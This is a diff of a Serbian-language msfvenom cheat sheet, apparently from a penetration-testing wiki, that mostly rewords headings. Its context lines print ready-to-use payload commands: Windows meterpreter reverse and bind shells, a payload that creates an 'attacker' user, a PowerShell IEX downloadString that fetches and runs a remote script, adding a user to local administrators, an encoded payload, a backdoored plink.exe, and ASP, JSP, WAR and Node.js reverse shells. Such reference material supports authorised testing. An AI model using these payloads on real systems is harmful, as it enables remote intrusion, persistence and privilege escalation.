@@ -8,14 +8,14 @@
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Može se takođe koristiti `-a` za specifikaciju arhitekture ili `--platform`
+Takođe se može koristiti `-a` za navođenje arhitekture ili `--platform`
 
-## Listing
+## Izlistavanje
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Uobičajeni parametri prilikom kreiranja shellcode-a
+## Uobičajeni parametri pri kreiranju shellcode-a
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -25,7 +25,7 @@ PrependSetuid=True #Use this to create a shellcode that will execute something w
 ```
 ## **Windows**
 
-### **Obrnuta ljuska**
+### **Reverse Shell**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
@@ -33,7 +33,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-### Kreiraj korisnika
+### Kreiranje korisnika
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
@@ -41,7 +41,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Izvrši Komandu**
+### **Izvršavanje komande**
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
@@ -50,7 +50,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Ugrađen unutar izvršnog fajla
+### Ugrađeno u izvršnu datoteku
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -79,7 +79,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **Web Based Payloads**
+## **Payloadi zasnovani na vebu**
 
 ### **PHP**
 
@@ -90,20 +90,20 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 ```
 ### ASP/x
 
-#### Obrnuta ljuska
+#### Reverse shell
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
 ```
 ### JSP
 
-#### Obrnuta ljuska
+#### Reverse shell
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
-### RAT
+### WAR
 
-#### Obrnuta ljuska
+#### Reverse Shell
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
 ```
@@ -111,7 +111,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Script jezik payloads**
+## **Payload-i skriptnih jezika**
 
 ### **Perl**
 ```bash
